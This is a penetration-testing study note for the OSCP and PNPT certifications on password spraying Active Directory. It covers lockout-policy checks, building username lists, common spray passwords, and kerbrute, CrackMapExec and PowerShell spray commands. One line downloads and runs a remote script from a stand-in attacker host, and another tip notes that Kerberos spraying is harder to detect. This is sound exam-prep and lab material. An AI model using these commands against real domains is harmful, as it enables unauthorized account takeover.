---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, password-spraying]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.2 — Initial Access"]
netgod-refs: []
---

# S3-06 — Password Spraying Active Directory

## Why Spraying Instead of Brute Force

**Brute force:** Try many passwords against one account.
**Password spray:** Try one password against many accounts.

The distinction is operationally critical in Active Directory environments. AD domains have account lockout policies — typically locking an account after 3–5 failed attempts. Brute forcing one account triggers lockout after 5 attempts. Spraying one password across 500 accounts means each account only sees 1 failed attempt — none lock out.

**The math:**
- Domain has 500 users
- Lockout threshold: 5 attempts per 30-minute observation window
- Brute force `Administrator` with rockyou.txt: 5 attempts → account locked → game over
- Spray `Password1` across 500 users: 500 failed attempts, 0 lockouts, potentially 1+ hits

---

## Getting the Password Policy — Non-Negotiable First Step

Before spraying a single password, you MUST know the password policy. Spray without this and you may lock out hundreds of accounts — an instant incident response trigger in real engagements, and a machine you can no longer access on OSCP.

### With Credentials

```bash
# CrackMapExec (fastest):
crackmapexec smb DC_IP -u user -p pass --pass-pol

# Output:
# [+] Enumerated password policy
# Minimum password length: 8
# Password history length: 24
# Maximum password age: Not Set
# Password Complexity Flags: Password Complexity Enabled
# [*] Minimum password age: 1 day
# [*] Reset Account Lockout Counter: 30 minutes
# [*] Locked Account Duration: 30 minutes  
# [*] Account Lockout Threshold: 5
# [*] Forced Log off Time: Not Set

# impacket:
impacket-GetADUsers domain.local/user:pass -dc-ip DC_IP -all 2>/dev/null | head -5

# ldapsearch:
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass \
  -b "DC=domain,DC=local" "(objectClass=domain)" \
  lockoutThreshold lockoutObservationWindow lockoutDuration minPwdLength
```

### Without Credentials (null session)

```bash
# enum4linux:
enum4linux -P DC_IP    # -P = password policy only

# rpcclient:
rpcclient -U "" DC_IP -N
rpcclient $> getdompwinfo

# nmap:
nmap --script smb-security-mode -p445 DC_IP
```

### On a Domain-Joined Machine

```cmd
net accounts /domain
```

### Interpreting the Policy

The critical fields:

| Field | What It Means | Spray Impact |
|-------|--------------|-------------|
| `Account Lockout Threshold` | Attempts before lockout | Spray fewer times than this |
| `Reset Account Lockout Counter` | Minutes before failed count resets | Wait this long between spray rounds |
| `Locked Account Duration` | How long account stays locked | If you lock one, it unlocks after this |
| `Minimum password length` | Minimum chars | Your spray password must meet this |
| `Password Complexity` | Uppercase + lowercase + number/symbol required | Your spray password must meet this |

**Safe spray rule:** Spray `threshold - 1` times per observation window.

```
Threshold: 5 attempts
Observation window: 30 minutes
Safe: Spray 4 times, then wait 31 minutes before spraying again
Safest: Spray 1 time, wait 31 minutes, spray 1 more time
```

If `Account Lockout Threshold: 0` → no lockout policy → can brute force safely (rare, but happens in poorly configured domains).

---

## Building Your Username List

You need a valid username list before spraying. Use what you've already enumerated.

### From enum4linux / CrackMapExec

```bash
# CME users list:
crackmapexec smb DC_IP -u user -p pass --users | awk '{print $5}' | grep -v '\[' > users.txt
# Strip header lines, extract just usernames

# enum4linux:
enum4linux -U DC_IP | grep "user:" | awk -F'[][]' '{print $2}' > users.txt
```

### From ldapdomaindump

```bash
ldapdomaindump -u domain\\user -p pass DC_IP -o /tmp/loot/
# Parse domain_users.grep:
grep "sAMAccountName:" /tmp/loot/domain_users.grep | awk '{print $2}' > users.txt
```

### From kerbrute (no creds)

```bash
kerbrute userenum --dc DC_IP -d domain.local usernames_wordlist.txt -o valid_users.txt
grep "VALID" valid_users.txt | awk -F'@' '{print $1}' | awk '{print $NF}' > users.txt
```

### From BloodHound dump

```bash
cat /tmp/loot/domain_users.json | python3 -c "
import json,sys
users = json.load(sys.stdin)
for u in users:
    if 'sAMAccountName' in u['attributes']:
        print(u['attributes']['sAMAccountName'])
" > users.txt
```

### Manual naming convention generation

```bash
# Use username-anarchy for name-based generation:
# If you have a staff directory or LinkedIn list of full names:
while IFS= read -r line; do
    fname=$(echo $line | awk '{print $1}' | tr '[:upper:]' '[:lower:]')
    lname=$(echo $line | awk '{print $2}' | tr '[:upper:]' '[:lower:]')
    echo "${fname}.${lname}"
    echo "${fname:0:1}.${lname}"
    echo "${fname}${lname}"
    echo "${fname:0:1}${lname}"
done < names.txt > generated_usernames.txt
```

---

## Choosing Passwords to Spray

The goal is a password that:
1. Meets the minimum complexity requirements of the policy
2. Is commonly chosen by users (high hit probability)
3. Won't obviously violate any recently used passwords (history policy)

### High-Probability Passwords

**Universal — meets most complexity requirements:**
```
Password1
Password1!
Welcome1
Welcome1!
Welcome2023
Password2024
```

**Season + Year (people set passwords when prompted — often at year start/change):**
```
Spring2024
Summer2024!
Fall2024
Winter2024
Autumn2024
```

**Month + Year:**
```
January2024
January2024!
Jan2024
January1
```

**Company name variations:**
```
# If targeting Eurostop:
Eurostop1
Eurostop!
Eurostop2024
Eurostop1!
London1           # If company is in London
```

**Common patterns that meet complexity:**
```
qwerty123!
abc123!
letmein1
changeme1
P@ssw0rd
P@$$w0rd
```

**Domain name variations:**
```
# If domain is eurostop.local:
Eurostop1
```

### How Many Passwords to Spray Per Round

```
Threshold 5 → Spray max 3 passwords per observation window (leave buffer)
Threshold 3 → Spray 1 password per observation window only
Threshold 0 → No limit (can brute force)
```

**In practice on OSCP:** Spray 1–2 passwords, wait. Check if any hits. Spray 1–2 more after the observation window. Never spray 5+ at the threshold limit.

---

## Spraying Tools

### Kerbrute (Fastest — No SMB Noise)

Kerbrute uses Kerberos pre-authentication to spray — it doesn't generate SMB traffic and is harder to detect than SMB-based spraying.

```bash
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1'
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1' -o valid_creds.txt

# Multiple passwords — run sequentially with delay:
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1'
sleep 1860   # Wait 31 minutes (observation window + buffer)
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Welcome1'
```

**Reading output:**
```
[+] VALID LOGIN: jsmith@domain.local:Password1
[-] LOCKED ACCOUNT: bsmith@domain.local
[+] VALID LOGIN: administrator@domain.local:Password1
```

If you see `LOCKED ACCOUNT` — stop immediately. You've hit the threshold on an account (unusual — means they had 4 failed attempts before your spray). Do not continue until the lockout duration expires.

### CrackMapExec (SMB — Most Feature-Rich)

```bash
# Spray one password across all users:
crackmapexec smb DC_IP -u users.txt -p 'Password1' --continue-on-success

# Spray across subnet (all machines):
crackmapexec smb 192.168.0.0/24 -u users.txt -p 'Password1' --continue-on-success

# Important flag: --continue-on-success
# Without it: CME stops after first valid credential found
# With it: continues and finds ALL valid credentials

# Spray against WinRM:
crackmapexec winrm 192.168.0.0/24 -u users.txt -p 'Password1' --continue-on-success

# Multiple passwords (run with delay between):
crackmapexec smb DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# --no-bruteforce = pair users[0] with passwords[0], users[1] with passwords[1]
# NOT every combination — important distinction!

# Without --no-bruteforce (dangerous — tries every combination):
crackmapexec smb DC_IP -u users.txt -p passwords.txt
# If passwords.txt has 5 entries and threshold is 5 → lockouts!
```

**Reading CME output:**
```
SMB  192.168.0.50  445  DC01  [+] domain.local\jsmith:Password1
SMB  192.168.0.50  445  DC01  [+] domain.local\svc_admin:Password1 (Pwn3d!)
SMB  192.168.0.50  445  DC01  [-] domain.local\bsmith:Password1 STATUS_LOGON_FAILURE
SMB  192.168.0.50  445  DC01  [-] domain.local\csmith:Password1 STATUS_ACCOUNT_LOCKED_OUT ← STOP
```

`(Pwn3d!)` = valid credential AND local admin on that host.
`STATUS_ACCOUNT_LOCKED_OUT` = that account was already at threshold − 1 before your spray hit it. Stop spraying and wait for the lockout duration to expire before continuing.

### Spray from a Domain-Joined Windows Machine

If you're operating from a compromised Windows host inside the domain:

```powershell
# PowerShell spray using LDAP:
$users = Get-Content users.txt
$password = "Password1"
$domain = "domain.local"

foreach ($user in $users) {
    try {
        $entry = New-Object DirectoryServices.DirectoryEntry("LDAP://$domain", "$domain\$user", $password)
        $search = New-Object DirectoryServices.DirectorySearcher($entry)
        $result = $search.FindOne()
        if ($result -ne $null) {
            Write-Host "[+] VALID: $user : $password" -ForegroundColor Green
        }
    } catch {
        # Failed login
    }
}
```

**Using DomainPasswordSpray.ps1 (PowerShell tool):**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/DomainPasswordSpray.ps1')
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Password1' -OutFile valid_creds.txt
```

**Using Spray.ps1:**
```powershell
.\Spray.ps1 -Password 'Password1' -UserList users.txt -Domain domain.local
```

---

## Interpreting Results

### STATUS Codes

| Status | Meaning | What to Do |
|--------|---------|-----------|
| `[+] VALID LOGIN` | Password is correct | Use immediately |
| `STATUS_LOGON_FAILURE` | Wrong password | Normal failure — continue |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account is locked | STOP — wait lockout duration |
| `STATUS_ACCOUNT_DISABLED` | Account disabled | Skip — can't use even if cracked |
| `STATUS_PASSWORD_MUST_CHANGE` | Password expired | Account is valid — try to change password |
| `STATUS_PASSWORD_EXPIRED` | Password expired | Same as above |

### What to Do When You Get a Hit

```bash
# Confirm the credential works:
crackmapexec smb DC_IP -u valid_user -p valid_pass

# Check where this user has admin access:
crackmapexec smb 192.168.0.0/24 -u valid_user -p valid_pass --continue-on-success
# Look for (Pwn3d!)

# Collect AD data with these credentials:
bloodhound-python -u valid_user -p valid_pass -d domain.local -ns DC_IP --zip -c All
impacket-GetUserSPNs domain.local/valid_user:valid_pass -dc-ip DC_IP -request -outputfile tgs.txt
impacket-GetNPUsers domain.local/valid_user:valid_pass -dc-ip DC_IP -request -outputfile asrep.txt
ldapdomaindump -u domain\\valid_user -p valid_pass DC_IP -o /tmp/loot/

# Try WinRM:
crackmapexec winrm 192.168.0.0/24 -u valid_user -p valid_pass

# Try evil-winrm if WinRM available:
evil-winrm -i TARGET -u valid_user -p valid_pass
```

---

## Fine Grained Password Policies (FGPP)

Modern AD environments can have **Fine Grained Password Policies** — different password policies for different user groups. This means some accounts may have stricter or more lenient lockout thresholds than the default domain policy.

```powershell
# Check for Fine Grained Password Policies:
Get-ADFineGrainedPasswordPolicy -Filter *

# Check which policy applies to a specific user:
Get-ADUserResultantPasswordPolicy -Identity jsmith
```

**Impact on spraying:** If high-privileged accounts have a stricter FGPP (e.g., lockout after 3 attempts vs 5 for normal users), spraying with the domain default threshold may lock out privileged accounts. Always check for FGPP before spraying admin accounts.

---

## OSCP and PNPT Exam Context

**PNPT:** Password spraying is explicitly part of the TCM Security curriculum. The exam network will typically have at least one user account with a common password. Spraying is often the step between "I have no creds" and "I have domain user creds" — unlocking all subsequent enumeration.

**OSCP:** Spraying is fully allowed and unrestricted. No Metasploit is needed — kerbrute and CME are the tools. Check the domain policy first (always), spray conservatively (threshold − 2), and have all other enumeration ready to run the moment you get a hit.

**Time budget on exam:**
- Get password policy: 2 minutes
- Build user list: 5 minutes (use existing CME/kerbrute output)
- First spray round: 3–5 minutes
- Wait observation window: 30 minutes (do other work during this time)
- Second round: 3–5 minutes
- Total: 45 minutes maximum before you have results or move on

---

## The Full Spray Workflow — Step by Step

```bash
# Step 1 — Get password policy:
crackmapexec smb DC_IP -u '' -p '' --pass-pol 2>/dev/null    # Null session
# or:
crackmapexec smb DC_IP -u user -p pass --pass-pol

# Step 2 — Note critical values:
# Lockout Threshold: 5
# Observation Window: 30 minutes
# Minimum Password Length: 8

# Step 3 — Get valid usernames:
crackmapexec smb DC_IP -u user -p pass --users | awk '{print $5}' | grep '\.' > users.txt
# or:
kerbrute userenum --dc DC_IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerb_users.txt
grep "VALID" kerb_users.txt | awk '{print $NF}' | cut -d@ -f1 > users.txt

# Step 4 — Spray round 1 (threshold − 2 = 3 attempts max per window):
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1' -o spray1.txt
crackmapexec smb DC_IP -u users.txt -p 'Password1' --continue-on-success

# Step 5 — If no hits, wait observation window + buffer (31 minutes), then spray round 2:
sleep 1860
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Welcome1' -o spray2.txt
crackmapexec smb DC_IP -u users.txt -p 'Welcome1' --continue-on-success

# Step 6 — If hit found:
# - Run CME across subnet to find admin access
# - Collect BloodHound data
# - Run Kerberoasting + AS-REP roasting
# - Enumerate shares, SYSVOL, NETLOGON

# Step 7 — If still no hits after 3–4 rounds:
# - Try company-specific wordlist (company name + year)
# - Try season + year combinations
# - Move to other attack vectors (LLMNR, relay, web exploits)
# - Come back to spray after observation window resets
```

---

## Quick Reference

```bash
# Get password policy (with creds):
crackmapexec smb DC_IP -u user -p pass --pass-pol

# Get password policy (null session):
enum4linux -P DC_IP

# Spray with kerbrute (stealthy, Kerberos-based):
kerbrute passwordspray --dc DC_IP -d domain.local users.txt 'Password1'

# Spray with CME (SMB, more noisy but more features):
crackmapexec smb DC_IP -u users.txt -p 'Password1' --continue-on-success

# Spray across subnet:
crackmapexec smb 192.168.0.0/24 -u users.txt -p 'Password1' --continue-on-success

# Check for (Pwn3d!) — admin access after successful spray:
crackmapexec smb 192.168.0.0/24 -u found_user -p found_pass --continue-on-success

# STOP IMMEDIATELY if you see:
# STATUS_ACCOUNT_LOCKED_OUT

# Safe spray frequency:
# Spray (threshold-2) passwords per observation window
# Wait (observation window + 1 minute) between rounds
```

---

## Common Mistakes

> [!warning] Password spraying mistakes — some are catastrophic
> 1. **Spraying without checking the password policy first.** This is the cardinal sin. You may lock out hundreds of accounts. On a real engagement, this causes an incident. On OSCP, it locks accounts you need. ALWAYS check the policy first.
> 2. **Using `crackmapexec smb -u users.txt -p passwords.txt` without `--no-bruteforce`.** Without `--no-bruteforce`, CME tries EVERY password against EVERY user — a full matrix attack. With 5 passwords and 100 users, that's 500 attempts per user. Guaranteed lockouts. Always use `--continue-on-success` and only spray one password at a time, or use `--no-bruteforce` for paired lists.
> 3. **Not waiting the full observation window between rounds.** The observation window resets failed attempt counters. If you spray at minute 0 and minute 25 (before the 30-minute window resets), the second spray counts against the first. Wait the full window.
> 4. **Ignoring `STATUS_ACCOUNT_LOCKED_OUT` and continuing.** If you see this, a lockout has occurred. Stop immediately. Wait for the lockout duration to expire before continuing.
> 5. **Not having all other attacks ready before spraying.** The moment you get a valid credential, you should immediately run BloodHound collection, Kerberoasting, AS-REP roasting, and share enumeration. Prepare these commands in advance.
> 6. **Spraying with a password that doesn't meet complexity requirements.** If minimum length is 8 and complexity is required, `password` won't work — the DC rejects it with a different error than wrong password. Use passwords that actually meet policy.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Breaching Active Directory" | Password spraying lab from external position |
| TryHackMe — "Compromising Active Directory" | Full internal spray chain |
| HTB — Monteverde | Spray with username as password → domain user → lateral move |
| HTB — Active | Username enumeration → spray → Kerberoast chain |
| TCM Security — PEH Course | Full password spray demo with kerbrute and CME |
| Set up home lab | Windows DC + multiple user accounts with common passwords — practice spray without risk |
| [[PHANTOM/MODULE 4 — Active Directory/04.2 — Initial Access]] | Full technical depth in PHANTOM vault |
